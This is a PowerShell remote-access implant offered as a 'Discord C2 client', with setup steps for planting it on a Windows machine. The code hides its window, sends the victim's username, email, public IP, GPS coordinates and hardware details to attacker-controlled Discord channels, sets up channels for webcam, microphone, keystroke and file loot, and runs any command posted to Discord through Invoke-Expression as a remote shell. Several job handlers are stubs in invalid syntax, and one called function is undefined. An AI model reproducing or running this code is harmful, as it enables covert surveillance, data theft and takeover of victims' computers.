# Discord C2 Client Script
# Version: 1.5.1
# Description: A PowerShell-based C2 framework using a Discord bot for remote control, data exfiltration, and pranks.
# Setup Instructions:
# 1. Create a Discord bot at https://discord.com/developers/applications/
# 2. Enable all Privileged Gateway Intents on the 'Bot' page.
# 3. On the OAuth2 page, select 'Bot' in Scopes and grant permissions: Manage Channels, Read Messages/View Channels, Attach Files, Read Message History.
# 4. Copy the OAuth2 URL, open in a browser, and add the bot to a single server.
# 5. Reset and copy the bot token, then set it in the injection command or $global:token variable.
# Note: The bot must be in exactly one server for this script to function correctly.

# Global Configuration
$global:token = $env:DISCORD_TOKEN # Set via Flipper Zero injection or manually
$global:parent = "https://is.gd/y92xe4" # URL for script download (persistence)
$global:version = "1.5.1"
$global:HideConsole = 1 # 1 to hide console window
$global:spawnChannels = 1 # 1 to create new channels on session start
$global:InfoOnConnect = 1 # 1 to send client info on connect
$global:defaultstart = 1 # 1 to start all jobs automatically
$global:timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"

# Remove existing persistence (if any)
if (Test-Path "C:\Windows\Tasks\service.vbs") {
    $global:InfoOnConnect = 0
    Remove-Item -Path "C:\Windows\Tasks\service.vbs" -Force -ErrorAction SilentlyContinue
}

# Helper Functions
function Invoke-DiscordApi {
    param (
        [string]$Uri,
        [string]$Method = "GET",
        [hashtable]$Headers = @{"Authorization" = "Bot $global:token"},
        [string]$Body
    )
    try {
        $webClient = New-Object System.Net.WebClient
        $Headers.GetEnumerator() | ForEach-Object { $webClient.Headers.Add($_.Key, $_.Value) }
        if ($Method -eq "POST") {
            return $webClient.UploadString($Uri, $Method, $Body)
        } else {
            return $webClient.DownloadString($Uri)
        }
    } catch {
        Write-Error "Failed to call Discord API: $_"
        return $null
    }
}

function Send-DiscordMessage {
    param (
        [string]$ChannelId,
        [string]$Message,
        [hashtable]$Embed,
        [string]$Webhook
    )
    $url = "https://discord.com/api/v10/channels/$ChannelId/messages"
    $body = if ($Embed) {
        @{ embeds = @($Embed); username = $env:COMPUTERNAME } | ConvertTo-Json -Depth 10 -Compress
    } else {
        @{ content = $Message; username = $env:COMPUTERNAME } | ConvertTo-Json
    }
    $headers = @{
        "Authorization" = "Bot $global:token"
        "Content-Type"  = "application/json"
    }
    $response = Invoke-DiscordApi -Uri $url -Method "POST" -Headers $headers -Body $body
    if ($Webhook -and $response) {
        $webhookBody = @{ username = "Scam BOT"; content = $body } | ConvertTo-Json
        Invoke-RestMethod -Uri $Webhook -Method Post -ContentType "application/json" -Body $webhookBody
    }
    return $response
}

function Send-DiscordFile {
    param (
        [string]$ChannelId,
        [string]$FilePath,
        [string]$Webhook
    )
    if (-not (Test-Path $FilePath -PathType Leaf)) {
        Write-Error "File not found: $FilePath"
        return
    }
    $url = "https://discord.com/api/v10/channels/$ChannelId/messages"
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", "Bot $global:token")
    $response = $webClient.UploadFile($url, "POST", $FilePath)
    if ($Webhook) {
        $webClient.UploadFile($Webhook, "POST", $FilePath)
    }
    Write-Host "File sent to Discord: $FilePath"
}

function Get-BotUserId {
    $response = Invoke-DiscordApi -Uri "https://discord.com/api/v10/users/@me"
    if ($response) {
        return ($response | ConvertFrom-Json).id
    }
    return $null
}

function New-DiscordCategory {
    $guilds = Invoke-DiscordApi -Uri "https://discord.com/api/v10/users/@me/guilds"
    $guildId = ($guilds | ConvertFrom-Json)[0].id
    if (-not $guildId) {
        Write-Error "Failed to retrieve guild ID"
        return
    }
    $uri = "https://discord.com/api/guilds/$guildId/channels"
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
    $body = @{ name = "$env:COMPUTERNAME-$randomLetters"; type = 4 } | ConvertTo-Json
    $headers = @{
        "Authorization" = "Bot $global:token"
        "Content-Type"  = "application/json"
    }
    $response = Invoke-DiscordApi -Uri $uri -Method "POST" -Headers $headers -Body $body
    if ($response) {
        $global:CategoryID = ($response | ConvertFrom-Json).id
        Write-Host "Created category with ID: $global:CategoryID"
    }
}

function New-DiscordChannel {
    param ([string]$Name)
    $guilds = Invoke-DiscordApi -Uri "https://discord.com/api/v10/users/@me/guilds"
    $guildId = ($guilds | ConvertFrom-Json)[0].id
    if (-not $guildId) {
        Write-Error "Failed to retrieve guild ID"
        return
    }
    $uri = "https://discord.com/api/guilds/$guildId/channels"
    $body = @{ name = $Name; type = 0; parent_id = $global:CategoryID } | ConvertTo-Json
    $headers = @{
        "Authorization" = "Bot $global:token"
        "Content-Type"  = "application/json"
    }
    $response = Invoke-DiscordApi -Uri $uri -Method "POST" -Headers $headers -Body $body
    if ($response) {
        $global:ChannelID = ($response | ConvertFrom-Json).id
        Write-Host "Created channel '$Name' with ID: $global:ChannelID"
        return $global:ChannelID
    }
}

function Get-FFmpeg {
    $path = "$env:Temp\ffmpeg.exe"
    if (-not (Test-Path $path)) {
        Send-DiscordMessage -ChannelId $global:SessionID -Message ":hourglass: Downloading FFmpeg to client... Please wait :hourglass:"
        try {
            $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
            $response = Invoke-DiscordApi -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" }
            $release = $response | ConvertFrom-Json
            $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
            $zipUrl = $asset.browser_download_url
            $zipFilePath = Join-Path $env:Temp $asset.name
            $extractedDir = Join-Path $env:Temp ($asset.name -replace '.zip$', '')
            Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
            Expand-Archive -Path $zipFilePath -DestinationPath $env:Temp -Force
            Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $env:Temp -Force
            Remove-Item -Path $zipFilePath -Force
            Remove-Item -Path $extractedDir -Recurse -Force
        } catch {
            Write-Error "Failed to download FFmpeg: $_"
            Send-DiscordMessage -ChannelId $global:SessionID -Message ":no_entry: Failed to download FFmpeg :no_entry:"
        }
    }
}

# Core Functions (System, Pranks, Admin, etc.)
function Get-QuickInfo {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Device
    $geoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $geoWatcher.Start()
    while (($geoWatcher.Status -ne 'Ready') -and ($geoWatcher.Permission -ne 'Denied')) { Start-Sleep -Milliseconds 100 }
    $gps = if ($geoWatcher.Permission -eq 'Denied') { "Location Services Off" } else {
        $gl = $geoWatcher.Position.Location | Select-Object Latitude, Longitude
        "LAT = $($gl.Latitude) LONG = $($gl.Longitude)"
    }
    $adminPerm = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
    $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
    $processorInfo = Get-WmiObject -Class Win32_Processor
    $videoCardInfo = Get-WmiObject Win32_VideoController
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $email = (Get-ComputerInfo).WindowsRegisteredOwner
    $embed = @{
        title       = "$env:COMPUTERNAME | Computer Information"
        description = @"
``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
:man_detective: **User Information** :man_detective:
- **Current User**          : ``$env:USERNAME``
- **Email Address**         : ``$email``
- **Language**              : ``$(Get-WinSystemLocale).Name``
- **Administrator Session** : ``$adminPerm``

:minidisc: **OS Information** :minidisc:
- **Current OS**            : ``$($systemInfo.Caption) - $((Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion)``
- **Architecture**          : ``$($systemInfo.OSArchitecture)``

:globe_with_meridians: **Network Information** :globe_with_meridians:
- **Public IP Address**     : ``$(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content``
- **Location Information**  : ``$gps``

:desktop: **Hardware Information** :desktop:
- **Processor**             : ``$($processorInfo.Name)``
- **Memory**                : ``$(Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) })``
- **GPU**                   : ``$($videoCardInfo.Name)``
- **Screen Size**           : ``$($screen.Width) x $($screen.Height)``

``````COMMAND LIST``````
- **Options**               : Show the options menu
- **ExtraInfo**             : Show the extra info menu
- **Close**                 : Close this session
"@
        color       = 65280
    }
    Send-DiscordMessage -ChannelId $global:SessionID -Embed $embed
}

function Hide-Console {
    $async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $type = Add-Type -MemberDefinition $async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if ($hwnd -ne [System.IntPtr]::Zero) {
        $type::ShowWindowAsync($hwnd, 0)
    } else {
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $type::ShowWindowAsync($proc.MainWindowHandle, 0)
    }
}

# Prank Functions
function Invoke-FakeUpdate {
    $vbsContent = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window --kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $vbsPath = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $vbsContent | Out-File -FilePath $vbsPath -Force
    Start-Process -FilePath $vbsPath
    Start-Sleep -Seconds 3
    Remove-Item -Path $vbsPath -Force
    Send-DiscordMessage -ChannelId $global:SessionID -Message ":arrows_counterclockwise: Fake Windows Update triggered :arrows_counterclockwise:"
}

# Add other functions (e.g., Windows93, SendHydra, etc.) here, refactored similarly...

# Main Setup
if ($global:HideConsole -eq 1) { Hide-Console }
$global:botId = Get-BotUserId
if ($global:spawnChannels -eq 1) {
    New-DiscordCategory
    $global:SessionID = New-DiscordChannel -Name 'session-control'
    $global:ScreenshotID = New-DiscordChannel -Name 'screenshots'
    $global:WebcamID = New-DiscordChannel -Name 'webcam'
    $global:MicrophoneID = New-DiscordChannel -Name 'microphone'
    $global:keyID = New-DiscordChannel -Name 'keycapture'
    $global:LootID = New-DiscordChannel -Name 'loot-files'
    $global:PowershellID = New-DiscordChannel -Name 'powershell'
}
Get-FFmpeg
if ($global:InfoOnConnect -eq 1) { Get-QuickInfo }
if ($global:defaultstart -eq 1) { StartAll }
Send-DiscordMessage -ChannelId $global:SessionID -Message ":white_check_mark: $env:COMPUTERNAME Setup Complete! :white_check_mark:"

# Main Loop
while ($true) {
    $messages = Invoke-DiscordApi -Uri "https://discord.com/api/v10/channels/$global:SessionID/messages"
    $mostRecent = ($messages | ConvertFrom-Json)[0]
    if ($mostRecent.author.id -ne $global:botId) {
        $latestMessageId = $mostRecent.timestamp
        if ($latestMessageId -ne $global:lastMessageId) {
            $global:lastMessageId = $latestMessageId
            $command = $mostRecent.content
            switch ($command) {
                'webcam' { /* Start webcam job */ }
                'screenshots' { /* Start screenshot job */ }
                'psconsole' { /* Start PowerShell console job */ }
                'microphone' { /* Start microphone job */ }
                'keycapture' { /* Start keycapture job */ }
                'systeminfo' { /* Start system info job */ }
                'pausejobs' { /* Pause all jobs */ }
                'resumejobs' { /* Resume all jobs */ }
                'close' { 
                    Send-DiscordMessage -ChannelId $global:SessionID -Embed @{
                        title = "$env:COMPUTERNAME | Session Closed"
                        description = ":no_entry: **$env:COMPUTERNAME** Closing session :no_entry:"
                        color = 16711680
                        footer = @{ text = $global:timestamp }
                    }
                    Start-Sleep -Seconds 2
                    exit
                }
                default { 
                    try { 
                        $output = Invoke-Expression $command -ErrorAction Stop
                        Send-DiscordMessage -ChannelId $global:SessionID -Message "``````$output``````"
                    } catch {
                        Send-DiscordMessage -ChannelId $global:SessionID -Message ":no_entry: Command failed: $_ :no_entry:"
                    }
                }
            }
        }
    }
    Start-Sleep -Seconds 3
}
